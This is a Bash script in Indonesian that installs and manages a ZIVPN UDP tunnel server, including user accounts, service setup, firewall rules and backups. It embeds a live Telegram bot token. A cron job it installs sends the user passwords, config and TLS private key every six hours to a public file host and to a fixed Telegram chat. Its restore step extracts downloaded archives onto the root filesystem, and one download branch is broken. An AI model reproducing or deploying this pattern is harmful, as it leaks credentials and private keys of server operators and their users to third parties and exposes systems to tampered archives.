#!/bin/bash
# =============================================
#   ZIVPN UDP Manager
#   By: Custom Script (based on ZIVPN official binary)
#   OS: Ubuntu 20.04 / 22.04 / 24.04
# =============================================

# === KONFIGURASI BOT TELEGRAM (LANGSUNG AKTIF) ===
BOT_TOKEN="7340219400:AAHjx6z99gf5MiBb7m3HK-JJ-cRBAQwp_28"
CHAT_ID="6198984094"

# === WARNA ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
PURPLE='\033[0;35m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# === PATH ===
ZIVPN_DIR="/etc/zivpn"
ZIVPN_BIN="/usr/local/bin/zivpn"
CONFIG_FILE="$ZIVPN_DIR/config.json"
USERS_DB="$ZIVPN_DIR/users.db"
CERT_FILE="$ZIVPN_DIR/zivpn.crt"
KEY_FILE="$ZIVPN_DIR/zivpn.key"
SERVICE_FILE="/etc/systemd/system/zivpn.service"
BACKUP_DIR="$ZIVPN_DIR/backup"
BACKUP_CONFIG="$ZIVPN_DIR/backup.conf"

# === FUNGSI UTILITAS ===

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[ERROR]${NC} Script ini harus dijalankan sebagai root!"
        echo -e "Gunakan: ${YELLOW}sudo bash $0${NC}"
        exit 1
    fi
}

get_ip() {
    curl -4 -s ifconfig.me 2>/dev/null || curl -4 -s icanhazip.com 2>/dev/null || hostname -I | awk '{print $1}'
}

get_domain() {
    local ip=$(get_ip)
    local domain=""
    domain=$(dig +short -x "$ip" 2>/dev/null | head -n1 | sed 's/\.$//')
    if [[ -z "$domain" ]]; then
        domain="$ip"
    fi
    echo "$domain"
}

get_isp() {
    curl -s ipinfo.io/org 2>/dev/null | cut -d' ' -f2- || echo "Unknown"
}

get_city() {
    curl -s ipinfo.io/city 2>/dev/null || echo "Unknown"
}

get_ram() {
    local total_ram=$(free -m | awk '/Mem:/ {print $2}')
    local used_ram=$(free -m | awk '/Mem:/ {print $3}')
    local ram_percent=$((used_ram * 100 / total_ram))
    
    if [[ $ram_percent -lt 50 ]]; then
        echo -e "${GREEN}${used_ram}MB/${total_ram}MB${NC}"
    elif [[ $ram_percent -lt 80 ]]; then
        echo -e "${YELLOW}${used_ram}MB/${total_ram}MB${NC}"
    else
        echo -e "${RED}${used_ram}MB/${total_ram}MB${NC}"
    fi
}

get_cpu() {
    local cpu_model=$(lscpu | grep "Model name" | cut -d':' -f2 | xargs | cut -d' ' -f1-4)
    local cpu_cores=$(nproc)
    echo "${cpu_model} (${cpu_cores} Core)"
}

get_os() {
    lsb_release -d | cut -d':' -f2 | xargs
}

is_installed() {
    [[ -f "$ZIVPN_BIN" && -f "$CONFIG_FILE" ]]
}

# === FUNGSI TELEGRAM ===

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="HTML" > /dev/null 2>&1
}

send_telegram_file() {
    local file="$1"
    local caption="$2"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
        -F chat_id="$CHAT_ID" \
        -F document=@"$file" \
        -F caption="$caption" > /dev/null 2>&1
}

# === FUNGSI BANNER ===

banner() {
    clear
    echo -e "${CYAN}"
    echo -e "  ███████╗██╗██╗   ██╗██████╗ ███╗   ██╗"
    echo -e "  ╚══███╔╝██║██║   ██║██╔══██╗████╗  ██║"
    echo -e "    ███╔╝ ██║██║   ██║██████╔╝██╔██╗ ██║"
    echo -e "   ███╔╝  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║"
    echo -e "  ███████╗██║ ╚████╔╝ ██║     ██║ ╚████║"
    echo -e "  ╚══════╝╚═╝  ╚═══╝  ╚═╝     ╚═╝  ╚═══╝"
    echo -e "${NC}"
    echo -e "${WHITE}  ════════════════════════════════════════${NC}"
    echo -e "${YELLOW}         UDP Manager for ZIVPN App${NC}"
    echo -e "${WHITE}  ════════════════════════════════════════${NC}"
    
    if is_installed; then
        local ip=$(get_ip)
        local domain=$(get_domain)
        local isp=$(get_isp)
        local city=$(get_city)
        local ram=$(get_ram)
        local cpu=$(get_cpu)
        local os=$(get_os)
        local status=$(systemctl is-active zivpn.service 2>/dev/null)
        
        echo -e "  ${WHITE}Status   :${NC} $([[ "$status" == "active" ]] && echo "${GREEN}● AKTIF${NC}" || echo "${RED}● MATI${NC}")"
        echo -e "  ${WHITE}IP       :${NC} ${CYAN}$ip${NC}"
        echo -e "  ${WHITE}Domain   :${NC} ${CYAN}$domain${NC}"
        echo -e "  ${WHITE}ISP      :${NC} ${YELLOW}$isp${NC}"
        echo -e "  ${WHITE}Kota     :${NC} ${YELLOW}$city${NC}"
        echo -e "  ${WHITE}RAM      :${NC} $ram"
        echo -e "  ${WHITE}CPU      :${NC} ${YELLOW}$cpu${NC}"
        echo -e "  ${WHITE}OS       :${NC} ${YELLOW}$os${NC}"
        echo -e "  ${WHITE}Port     :${NC} ${CYAN}5667 / 6000-19999 (UDP)${NC}"
    fi
    echo -e "${WHITE}  ════════════════════════════════════════${NC}"
    echo ""
}

press_enter() {
    echo ""
    echo -e "${YELLOW}Tekan [ENTER] untuk kembali ke menu...${NC}"
    read -r
}

# === FUNGSI SET DOMAIN ===

set_domain() {
    banner
    echo -e "${BOLD}${YELLOW}[ SET DOMAIN ]${NC}"
    echo ""
    
    if [[ ! -f "$BACKUP_CONFIG" ]]; then
        echo "DOMAIN=\"\"" > "$BACKUP_CONFIG"
    fi
    
    source "$BACKUP_CONFIG"
    echo -e "  Domain saat ini: ${CYAN}${DOMAIN:-Belum diatur}${NC}"
    echo ""
    read -rp "$(echo -e "${WHITE}Masukkan domain baru : ${NC}")" new_domain
    
    if [[ -n "$new_domain" ]]; then
        echo "DOMAIN=\"$new_domain\"" > "$BACKUP_CONFIG"
        echo -e "${GREEN}Domain berhasil disimpan!${NC}"
    else
        echo -e "${YELLOW}Domain tidak diubah.${NC}"
    fi
    
    echo ""
    press_enter
}

# === FUNGSI USER DB ===
# Format users.db: PASSWORD|EXPIRED|LIMIT_IP

load_users() {
    if [[ ! -f "$USERS_DB" ]]; then
        touch "$USERS_DB"
    fi
}

user_exists() {
    local password="$1"
    grep -q "^$password|" "$USERS_DB" 2>/dev/null
}

update_config_json() {
    local today=$(date +%Y-%m-%d)
    local passwords=()

    while IFS='|' read -r pass expiry limit; do
        if [[ "$expiry" == "unlimited" ]] || [[ "$expiry" > "$today" ]] || [[ "$expiry" == "$today" ]]; then
            passwords+=("\"$pass\"")
        fi
    done < "$USERS_DB"

    if [[ ${#passwords[@]} -eq 0 ]]; then
        local pass_list="\"zivpn\""
    else
        local pass_list=$(IFS=','; echo "${passwords[*]}")
    fi

    cat > "$CONFIG_FILE" <<EOF
{
  "listen": ":5667",
  "cert": "$CERT_FILE",
  "key": "$KEY_FILE",
  "obfs": "zivpn",
  "auth": {
    "mode": "passwords",
    "config": [$pass_list]
  }
}
EOF
    systemctl restart zivpn.service 2>/dev/null
}

# === TAMBAH USER ===

add_user() {
    banner
    echo -e "${BOLD}${YELLOW}[ TAMBAH USER ]${NC}"
    echo ""
    load_users
    source "$BACKUP_CONFIG" 2>/dev/null

    read -rp "$(echo -e "${WHITE}Username/Password : ${NC}")" base_password
    if [[ -z "$base_password" ]]; then
        echo -e "${RED}[!] Tidak boleh kosong!${NC}"
        press_enter
        return
    fi

    random_num=$((RANDOM % 900 + 100))
    password="${base_password}${random_num}"

    while user_exists "$password"; do
        random_num=$((RANDOM % 900 + 100))
        password="${base_password}${random_num}"
    done

    read -rp "$(echo -e "${WHITE}Limit IP (0=unlimited) : ${NC}")" limit_ip
    if ! [[ "$limit_ip" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Masukkan angka!${NC}"
        press_enter
        return
    fi

    read -rp "$(echo -e "${WHITE}Expired (hari) : ${NC}")" days
    
    if ! [[ "$days" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Masukkan angka!${NC}"
        press_enter
        return
    fi

    if [[ "$days" -eq 0 ]]; then
        expiry="unlimited"
        expe="Unlimited"
        masa_aktif="Selamanya"
        limit_display="Unlimited"
    else
        expiry=$(date -d "+$days days" +%Y-%m-%d)
        tgl=$(date -d "+$days days" +"%d")
        bln=$(date -d "+$days days" +"%b")
        thn=$(date -d "+$days days" +"%Y")
        expe="$tgl $bln, $thn"
        masa_aktif="$days hari"
        [[ "$limit_ip" -eq 0 ]] && limit_display="Unlimited" || limit_display="$limit_ip Device"
    fi

    tgl2=$(date +"%d")
    bln2=$(date +"%b")
    thn2=$(date +"%Y")
    tnggl="$tgl2 $bln2, $thn2"

    echo "$password|$expiry|$limit_ip" >> "$USERS_DB"
    update_config_json

    echo ""
    echo -e "${WHITE}══════════════════════════════════════════${NC}"
    echo -e "${GREEN}  ✓ Terima kasih sudah order kak😁${NC}"
    echo -e "${WHITE}══════════════════════════════════════════${NC}"
    echo -e "  ${CYAN}ZIVPN UDP${NC}"
    echo -e "${WHITE}──────────────────────────────────────────${NC}"

    if [[ -n "$DOMAIN" ]]; then
        echo -e "  Domain      : ${CYAN}$DOMAIN${NC}"
    else
        echo -e "  Domain      : ${CYAN}$(get_domain)${NC}"
    fi
    echo -e "  Password    : ${YELLOW}$password${NC}"
    echo -e "  Limit IP    : ${MAGENTA}$limit_display${NC}"
    echo -e "  Lokasi      : ${CYAN}$(get_city)${NC}"
    echo -e "${WHITE}──────────────────────────────────────────${NC}"
    echo -e "  Tanggal Buat: ${GREEN}$tnggl${NC}"
    echo -e "  Tanggal Exp : ${YELLOW}$expe${NC}"
    echo -e "  Masa Aktif  : ${YELLOW}$masa_aktif${NC}"
    echo -e "${WHITE}──────────────────────────────────────────${NC}"
    echo -e "  ${YELLOW}Tutorial ZIVPN APP / UDP Tunnel${NC}"
    echo -e "${WHITE}──────────────────────────────────────────${NC}"
    echo -e "  1. Buka ZIVPN App"
    echo -e "  2. Centang Udp"
    echo -e "  3. Klik Garis tiga ( dipojok kiri atas )"
    echo -e "  4. Klik Udp tunnel setting"

    if [[ -n "$DOMAIN" ]]; then
        echo -e "  5. UDP Server  : ${CYAN}$DOMAIN${NC}"
    else
        echo -e "  5. UDP Server  : ${CYAN}$(get_ip)${NC}"
    fi
    echo -e "     UDP Password: ${CYAN}$password${NC}"
    echo -e "  6. Klik APPLY → START"
    echo -e "${WHITE}══════════════════════════════════════════${NC}"
    
    send_telegram "✅ USER BARU
◇━━━━━━━━━━━━━━◇
Password : $password
Limit IP : $limit_display
Expired  : $expe
◇━━━━━━━━━━━━━━◇"
    
    press_enter
}

# === HAPUS USER ===

delete_user() {
    banner
    echo -e "${BOLD}${YELLOW}[ HAPUS USER ]${NC}"
    echo ""
    load_users

    if [[ ! -s "$USERS_DB" ]]; then
        echo -e "${YELLOW}Belum ada user.${NC}"
        press_enter
        return
    fi

    local i=1
    while IFS='|' read -r pass expiry limit; do
        echo -e "  ${CYAN}$i.${NC} $pass"
        ((i++))
    done < "$USERS_DB"
    
    echo ""
    read -rp "$(echo -e "${WHITE}Password user yang ingin dihapus : ${NC}")" password

    if ! user_exists "$password"; then
        echo -e "${RED}Password tidak ditemukan!${NC}"
        press_enter
        return
    fi

    read -rp "$(echo -e "${RED}Yakin hapus? [y/N] : ${NC}")" confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        sed -i "/^$password|/d" "$USERS_DB"
        update_config_json
        echo -e "${GREEN}User '$password' berhasil dihapus!${NC}"
        send_telegram "🗑 USER DIHAPUS\nPassword: $password"
    fi

    press_enter
}

# === LIST USER ===

list_users() {
    banner
    echo -e "${BOLD}${YELLOW}[ DAFTAR USER ]${NC}"
    echo ""
    load_users

    if [[ ! -s "$USERS_DB" ]]; then
        echo -e "${YELLOW}Belum ada user.${NC}"
        press_enter
        return
    fi

    local today=$(date +%Y-%m-%d)
    echo -e "${WHITE}PASSWORD            EXPIRED        LIMIT    STATUS${NC}"
    echo "──────────────────────────────────────────────────────"

    while IFS='|' read -r pass expiry limit; do
        if [[ "$expiry" == "unlimited" ]]; then
            status="${GREEN}Aktif${NC}"
            exp_display="${GREEN}Unlimited${NC}"
        elif [[ "$expiry" > "$today" ]] || [[ "$expiry" == "$today" ]]; then
            status="${GREEN}Aktif${NC}"
            exp_display="${YELLOW}$expiry${NC}"
        else
            status="${RED}Expired${NC}"
            exp_display="${RED}$expiry${NC}"
        fi
        
        [[ "$limit" == "0" ]] && limit_display="${GREEN}∞${NC}" || limit_display="${CYAN}$limit${NC}"
        
        printf "%-20s %-15s %-8s %s\n" "$pass" "$(echo -e $exp_display)" "$(echo -e $limit_display)" "$(echo -e $status)"
    done < "$USERS_DB"

    echo "──────────────────────────────────────────────────────"
    local total=$(wc -l < "$USERS_DB")
    echo -e "Total User: ${GREEN}$total${NC}"
    
    press_enter
}

# === PERPANJANG USER ===

renew_user() {
    banner
    echo -e "${BOLD}${YELLOW}[ PERPANJANG USER ]${NC}"
    echo ""
    load_users

    if [[ ! -s "$USERS_DB" ]]; then
        echo -e "${YELLOW}Belum ada user.${NC}"
        press_enter
        return
    fi

    local i=1
    while IFS='|' read -r pass expiry limit; do
        echo -e "  ${CYAN}$i.${NC} $pass"
        ((i++))
    done < "$USERS_DB"
    
    echo ""
    read -rp "$(echo -e "${WHITE}Password user : ${NC}")" password

    if ! user_exists "$password"; then
        echo -e "${RED}Password tidak ditemukan!${NC}"
        press_enter
        return
    fi

    read -rp "$(echo -e "${WHITE}Jumlah hari tambahan (0=unlimited) : ${NC}")" days

    if ! [[ "$days" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Masukkan angka!${NC}"
        press_enter
        return
    fi

    local old_expiry=$(grep "^$password|" "$USERS_DB" | cut -d'|' -f2)
    local limit=$(grep "^$password|" "$USERS_DB" | cut -d'|' -f3)

    if [[ "$days" -eq 0 ]]; then
        new_expiry="unlimited"
        exp_display="Unlimited"
    else
        local today=$(date +%Y-%m-%d)
        if [[ "$old_expiry" == "unlimited" ]] || [[ "$old_expiry" > "$today" ]]; then
            new_expiry=$(date -d "$old_expiry +$days days" +%Y-%m-%d 2>/dev/null || date -d "+$days days" +%Y-%m-%d)
        else
            new_expiry=$(date -d "+$days days" +%Y-%m-%d)
        fi
        exp_display=$(date -d "$new_expiry" +"%d %B %Y")
    fi

    sed -i "s/^$password|$old_expiry|$limit/$password|$new_expiry|$limit/" "$USERS_DB"
    update_config_json

    echo ""
    echo -e "${GREEN}User '$password' berhasil diperpanjang!${NC}"
    echo -e "Expired baru: ${YELLOW}$exp_display${NC}"
    
    send_telegram "🔄 USER DIPERPANJANG\nPassword: $password\nExpired: $exp_display"
    
    press_enter
}

# === UBAH LIMIT IP ===

change_limit() {
    banner
    echo -e "${BOLD}${YELLOW}[ UBAH LIMIT IP ]${NC}"
    echo ""
    load_users

    if [[ ! -s "$USERS_DB" ]]; then
        echo -e "${YELLOW}Belum ada user.${NC}"
        press_enter
        return
    fi

    local i=1
    while IFS='|' read -r pass expiry limit; do
        [[ "$limit" == "0" ]] && disp="Unlimited" || disp="$limit Device"
        echo -e "  ${CYAN}$i.${NC} $pass - Limit: ${YELLOW}$disp${NC}"
        ((i++))
    done < "$USERS_DB"
    
    echo ""
    read -rp "$(echo -e "${WHITE}Password user : ${NC}")" password

    if ! user_exists "$password"; then
        echo -e "${RED}Password tidak ditemukan!${NC}"
        press_enter
        return
    fi

    local expiry=$(grep "^$password|" "$USERS_DB" | cut -d'|' -f2)

    read -rp "$(echo -e "${WHITE}Limit IP baru (0=unlimited) : ${NC}")" new_limit
    if ! [[ "$new_limit" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}Masukkan angka!${NC}"
        press_enter
        return
    fi

    sed -i "s/^$password|$expiry|.*/$password|$expiry|$new_limit/" "$USERS_DB"
    update_config_json

    [[ "$new_limit" == "0" ]] && disp="Unlimited" || disp="$new_limit Device"
    echo -e "${GREEN}Limit IP berhasil diubah menjadi $disp${NC}"
    
    press_enter
}

# === CEK USER ONLINE ===

check_online_users() {
    banner
    echo -e "${BOLD}${YELLOW}[ CEK USER ONLINE ]${NC}"
    echo ""
    
    echo "Mengecek koneksi UDP yang aktif..."
    echo ""
    echo "────────────────────────────────────────"
    
    local connections=$(netstat -un 2>/dev/null | grep -c :5667)
    
    if [[ $connections -gt 0 ]]; then
        echo -e "  ${GREEN}Total Koneksi Aktif : $connections${NC}"
        echo ""
        echo "Detail Koneksi:"
        netstat -un 2>/dev/null | grep :5667 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | while read count ip; do
            echo -e "  ${CYAN}$ip${NC} - ${YELLOW}$count koneksi${NC}"
        done
    else
        echo -e "  ${YELLOW}Tidak ada koneksi aktif${NC}"
    fi
    
    echo "────────────────────────────────────────"
    press_enter
}

# === HAPUS EXPIRED ===

clean_expired() {
    banner
    echo -e "${BOLD}${YELLOW}[ HAPUS USER EXPIRED ]${NC}"
    echo ""
    load_users

    local today=$(date +%Y-%m-%d)
    local count=0
    local tmpfile=$(mktemp)

    while IFS='|' read -r pass expiry limit; do
        if [[ "$expiry" != "unlimited" && "$expiry" < "$today" ]]; then
            echo -e "  ${RED}✗ Dihapus:${NC} $pass"
            ((count++))
        else
            echo "$pass|$expiry|$limit" >> "$tmpfile"
        fi
    done < "$USERS_DB"

    if [[ $count -gt 0 ]]; then
        mv "$tmpfile" "$USERS_DB"
        update_config_json
        echo ""
        echo -e "${GREEN}✓ $count user expired dihapus!${NC}"
        send_telegram "🧹 CLEAN EXPIRED\n$count user expired dihapus"
    else
        rm -f "$tmpfile"
        echo -e "${YELLOW}Tidak ada user expired.${NC}"
    fi

    press_enter
}

# === STATUS SERVICE ===

status_service() {
    banner
    echo -e "${BOLD}${YELLOW}[ STATUS SERVICE ]${NC}"
    echo ""
    systemctl status zivpn.service --no-pager
    press_enter
}

# === RESTART SERVICE ===

restart_service() {
    banner
    echo -e "${BOLD}${YELLOW}[ RESTART SERVICE ]${NC}"
    echo ""
    systemctl restart zivpn.service
    sleep 1
    if systemctl is-active zivpn.service > /dev/null; then
        echo -e "${GREEN}✓ Service berhasil di-restart!${NC}"
    else
        echo -e "${RED}✗ Service gagal restart!${NC}"
    fi
    press_enter
}

# === SETUP AUTO BACKUP ===

setup_auto_backup() {
    crontab -l 2>/dev/null | grep -v "zivpn-auto-backup" | crontab -
    
    cat > /usr/local/bin/zivpn-auto-backup.sh <<'EOF'
#!/bin/bash
ZIVPN_DIR="/etc/zivpn"
BACKUP_DIR="$ZIVPN_DIR/backup"
USERS_DB="$ZIVPN_DIR/users.db"
CONFIG_FILE="$ZIVPN_DIR/config.json"
CERT_FILE="$ZIVPN_DIR/zivpn.crt"
KEY_FILE="$ZIVPN_DIR/zivpn.key"

BOT_TOKEN="7340219400:AAHjx6z99gf5MiBb7m3HK-JJ-cRBAQwp_28"
CHAT_ID="6198984094"

send_telegram_file() {
    local file="$1"
    local caption="$2"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
        -F chat_id="$CHAT_ID" \
        -F document=@"$file" \
        -F caption="$caption" > /dev/null 2>&1
}

IP_ADDRESS=$(curl -4 -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
DOMAIN_NAME=$(dig +short -x "$IP_ADDRESS" 2>/dev/null | head -n1 | sed 's/\.$//')
[ -z "$DOMAIN_NAME" ] && DOMAIN_NAME="$IP_ADDRESS"
DATE_NOW=$(date +"%Y-%m-%d")
FILE_DATE=$(date +"%Y%m%d-%H%M%S")

mkdir -p "$BACKUP_DIR"
BACKUP_FILE="$BACKUP_DIR/zivpn-backup-$FILE_DATE.tar.gz"
tar -czf "$BACKUP_FILE" "$USERS_DB" "$CONFIG_FILE" "$CERT_FILE" "$KEY_FILE" 2>/dev/null

UPLOAD_RESPONSE=$(curl -s -F "file=@$BACKUP_FILE" https://file.io)
LINK=$(echo "$UPLOAD_RESPONSE" | grep -o '"link":"[^"]*"' | cut -d'"' -f4)

echo "$DATE_NOW - $LINK" >> "$BACKUP_DIR/backup-links.txt"

CAPTION="✅ BACKUP  ZIVPN
File zip
◇━━━━━━━━━━━━━━◇
   ⚠️BACKUP NOTIF⚠️
     Detail Backup VPS
◇━━━━━━━━━━━━━━◇
IP VPS  : $IP_ADDRESS
DOMAIN  : $DOMAIN_NAME
Tanggal : $DATE_NOW
◇━━━━━━━━━━━━━━◇
Link Backup   : $LINK
◇━━━━━━━━━━━━━━◇
Silahkan copy Link dan restore di VPS baru"

send_telegram_file "$BACKUP_FILE" "$CAPTION"

cd "$BACKUP_DIR" && ls -t | tail -n +8 | xargs -r rm -f
EOF

    chmod +x /usr/local/bin/zivpn-auto-backup.sh
    (crontab -l 2>/dev/null; echo "0 */6 * * * /usr/local/bin/zivpn-auto-backup.sh") | crontab -
    echo -e "${GREEN}Auto backup aktif (setiap 6 jam)${NC}"
}

# === BACKUP MANUAL ===

backup_now() {
    banner
    echo -e "${BOLD}${YELLOW}[ BACKUP MANUAL ]${NC}"
    echo ""
    
    mkdir -p "$BACKUP_DIR"
    
    local ip=$(get_ip)
    local domain=$(get_domain)
    local date_now=$(date +"%Y-%m-%d")
    local file_date=$(date +"%Y%m%d-%H%M%S")
    
    local backup_file="$BACKUP_DIR/zivpn-backup-$file_date.tar.gz"
    echo "Membuat file backup..."
    tar -czf "$backup_file" "$USERS_DB" "$CONFIG_FILE" "$CERT_FILE" "$KEY_FILE" 2>/dev/null
    
    echo "Upload ke Telegram..."
    
    UPLOAD_RESPONSE=$(curl -s -F "file=@$backup_file" https://file.io)
    LINK=$(echo "$UPLOAD_RESPONSE" | grep -o '"link":"[^"]*"' | cut -d'"' -f4)
    
    echo "$date_now - $LINK" >> "$BACKUP_DIR/backup-links.txt"
    
    local caption="✅ BACKUP  ZIVPN
File zip
◇━━━━━━━━━━━━━━◇
   ⚠️BACKUP NOTIF⚠️
     Detail Backup VPS
◇━━━━━━━━━━━━━━◇
IP VPS  : $ip
DOMAIN  : $domain
Tanggal : $date_now
◇━━━━━━━━━━━━━━◇
Link Backup   : $LINK
◇━━━━━━━━━━━━━━◇
Silahkan copy Link dan restore di VPS baru"
    
    send_telegram_file "$backup_file" "$caption"
    
    echo -e "${GREEN}Backup selesai!${NC}"
    echo -e "Link: ${CYAN}$LINK${NC}"
    
    cd "$BACKUP_DIR" && ls -t | tail -n +8 | xargs -r rm -f
    press_enter
}

# === RESTORE BACKUP ===

restore_backup() {
    banner
    echo -e "${BOLD}${YELLOW}[ RESTORE BACKUP ]${NC}"
    echo ""
    
    mkdir -p "$BACKUP_DIR"
    
    echo -e "${WHITE}Pilih sumber backup:${NC}"
    echo -e "  ${CYAN}1${NC}. Dari file lokal"
    echo -e "  ${CYAN}2${NC}. Dari link download"
    echo -e "  ${CYAN}3${NC}. Lihat daftar link backup"
    echo ""
    read -rp "$(echo -e "${WHITE}Pilih [1-3] : ${NC}")" restore_choice
    
    case $restore_choice in
        1)
            local backups=($(ls -t "$BACKUP_DIR"/*.tar.gz 2>/dev/null))
            if [[ ${#backups[@]} -eq 0 ]]; then
                echo -e "${YELLOW}Tidak ada file backup.${NC}"
                press_enter
                return
            fi
            
            echo "Pilih file backup:"
            for i in "${!backups[@]}"; do
                echo -e "  ${CYAN}$((i+1))${NC}. $(basename "${backups[$i]}")"
            done
            echo ""
            read -rp "Pilih nomor : " file_num
            
            if [[ "$file_num" =~ ^[0-9]+$ ]] && [[ "$file_num" -le ${#backups[@]} ]]; then
                backup_file="${backups[$((file_num-1))]}"
            else
                echo -e "${RED}Pilihan tidak valid!${NC}"
                press_enter
                return
            fi
            ;;
        2)
            read -rp "Masukkan link download : " backup_link
            if [[ -z "$backup_link" ]]; then
                echo -e "${RED}Link tidak boleh kosong!${NC}"
                press_enter
                return
            fi
            
            echo "Downloading backup..."
            backup_file="/tmp/backup-zivpn.tar.gz"
            
            if [[ "$backup_link" == *"drive.google.com"* ]]; then
                file_id=$(echo "$backup_link" | grep -o 'id=[^&]*' | cut -d'=' -f2)
                [[ -z "$file_id" ]] && file_id=$(echo "$backup_link" | grep -o 'd/[^/]*' | cut -d'/' -f2)
                
                if [[ -n "$file_id" ]]; then
                    wget --no-check-certificate "https://docs.google.com/uc?export=download&id=$file_id" -O "$backup_file" 2>/dev/null
                    if grep -q "<html" "$backup_file" 2>/dev/null; then
                        curl -L -b "download_warning=1" "https://drive.usercontent.google.com/download?id=$file_id&confirm=t" -o "$backup_file"
                    fi
                else
                    echo -e "${RED}Gagal ekstrak file ID${NC}"
                    press_enter
                    return
                fi
            else
                wget -q "$backup_file" -O "$backup_file"
            fi
            
            if [[ ! -f "$backup_file" ]]; then
                echo -e "${RED}Gagal download!${NC}"
                press_enter
                return
            fi
            echo -e "${GREEN}Download selesai!${NC}"
            ;;
        3)
            if [[ -f "$BACKUP_DIR/backup-links.txt" ]]; then
                echo "Daftar link backup:"
                echo "────────────────────────────────"
                cat "$BACKUP_DIR/backup-links.txt"
                echo "────────────────────────────────"
            else
                echo -e "${YELLOW}Belum ada riwayat link.${NC}"
            fi
            press_enter
            return
            ;;
        *)
            echo -e "${RED}Pilihan tidak valid!${NC}"
            press_enter
            return
            ;;
    esac
    
    echo ""
    echo -e "${RED}PERHATIAN: Restore akan menimpa semua data!${NC}"
    read -rp "Yakin restore? [y/N] : " confirm
    
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Dibatalkan.${NC}"
        [[ "$restore_choice" == "2" ]] && rm -f "$backup_file"
        press_enter
        return
    fi
    
    local old_backup="$BACKUP_DIR/pre-restore-$(date +%Y%m%d-%H%M%S).tar.gz"
    tar -czf "$old_backup" "$USERS_DB" "$CONFIG_FILE" "$CERT_FILE" "$KEY_FILE" 2>/dev/null
    
    systemctl stop zivpn.service
    tar -xzf "$backup_file" -C / 2>/dev/null
    systemctl start zivpn.service
    
    echo ""
    echo -e "${GREEN}✓ RESTORE BERHASIL!${NC}"
    echo -e "Backup lama: $old_backup"
    
    send_telegram "✅ RESTORE BACKUP\nFile: $(basename "$backup_file")"
    
    [[ "$restore_choice" == "2" ]] && rm -f "$backup_file"
    press_enter
}

# === INSTALL ===

install_zivpn() {
    banner
    echo -e "${BOLD}${YELLOW}[ INSTALL ZIVPN UDP ]${NC}"
    echo ""

    if is_installed; then
        echo -e "${YELLOW}ZIVPN sudah terinstall!${NC}"
        press_enter
        return
    fi

    echo "Update sistem..."
    apt-get update -y > /dev/null 2>&1
    apt-get install -y wget curl openssl iptables ufw cron tar net-tools dnsutils > /dev/null 2>&1

    echo "Download binary..."
    mkdir -p "$ZIVPN_DIR" "$BACKUP_DIR"

    ARCH=$(uname -m)
    if [[ "$ARCH" == "x86_64" ]]; then
        BINARY_URL="https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64"
    elif [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
        BINARY_URL="https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-arm64"
    else
        echo -e "${RED}Arsitektur tidak didukung!${NC}"
        press_enter
        return
    fi

    wget -q "$BINARY_URL" -O "$ZIVPN_BIN"
    chmod +x "$ZIVPN_BIN"

    echo "Generate sertifikat..."
    openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 \
        -subj "/C=US/ST=CA/L=LA/O=ZIVPN/CN=zivpn" \
        -keyout "$KEY_FILE" -out "$CERT_FILE" > /dev/null 2>&1

    echo "Buat config..."
    touch "$USERS_DB"
    update_config_json

    echo "Buat service..."
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=ZIVPN UDP Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$ZIVPN_DIR
ExecStart=$ZIVPN_BIN server -c $CONFIG_FILE
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable zivpn.service > /dev/null 2>&1
    systemctl start zivpn.service

    echo "Setup firewall..."
    ufw allow 22/tcp > /dev/null 2>&1
    ufw allow 5667/udp > /dev/null 2>&1
    ufw allow 6000:19999/udp > /dev/null 2>&1
    ufw --force enable > /dev/null 2>&1

    setup_auto_backup

    (crontab -l 2>/dev/null; echo "0 3 * * * bash /usr/local/bin/zivpn-cron.sh") | crontab -

    cat > /usr/local/bin/zivpn-cron.sh <<'CRONEOF'
#!/bin/bash
TODAY=$(date +%Y-%m-%d)
USERS_DB="/etc/zivpn/users.db"
TMPFILE=$(mktemp)

while IFS='|' read -r pass expiry limit; do
    if [[ "$expiry" != "unlimited" && "$expiry" < "$TODAY" ]]; then
        continue
    else
        echo "$pass|$expiry|$limit" >> "$TMPFILE"
    fi
done < "$USERS_DB"

mv "$TMPFILE" "$USERS_DB"

passwords=()
while IFS='|' read -r pass expiry limit; do
    passwords+=("\"$pass\"")
done < "$USERS_DB"
pass_list=$(IFS=','; echo "${passwords[*]:-\"zivpn\"}")

cat > /etc/zivpn/config.json <<EOF
{
  "listen": ":5667",
  "cert": "/etc/zivpn/zivpn.crt",
  "key": "/etc/zivpn/zivpn.key",
  "obfs": "zivpn",
  "auth": {
    "mode": "passwords",
    "config": [$pass_list]
  }
}
EOF
systemctl restart zivpn.service
CRONEOF
    chmod +x /usr/local/bin/zivpn-cron.sh

    echo ""
    echo -e "${GREEN}✓ ZIVPN UDP BERHASIL DIINSTALL!${NC}"
    echo "IP      : $(get_ip)"
    echo "Domain  : $(get_domain)"
    echo "Port    : 5667 / 6000-19999 (UDP)"
    echo ""

